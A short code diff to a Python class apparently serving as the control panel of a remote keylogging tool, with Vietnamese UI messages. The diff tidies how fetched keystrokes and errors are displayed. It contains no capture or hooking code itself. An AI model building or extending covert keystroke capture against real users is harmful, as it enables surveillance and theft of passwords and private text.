@@ -39,7 +39,6 @@ class Keystroke(Request):
             self.PutTextWithNewLine('Hook đã được cài')
         else:
             self.PutTextWithNewLine('Lỗi')
-        
         return None
 
     def OnUnhookButton(self):
@@ -54,11 +53,10 @@ class Keystroke(Request):
         state, data = self.client.MakeRequest("FETCH")
         try:
             assert state == ClientState.SUCCEEDED, "KEYLOG FETCH request failed"
-            assert data, "No data retrieved"
-            data = data.decode("utf-8")
+            data = data.decode("utf-8") if data else ""
             self.PutTextWithNewLine(data)
         except Exception as e:
-            self.PutTextWithNewLine(e)
+            self.PutTextWithNewLine("Lỗi")
 
     def OnClearButton(self):
         state, _ = self.client.MakeRequest("CLEAR")
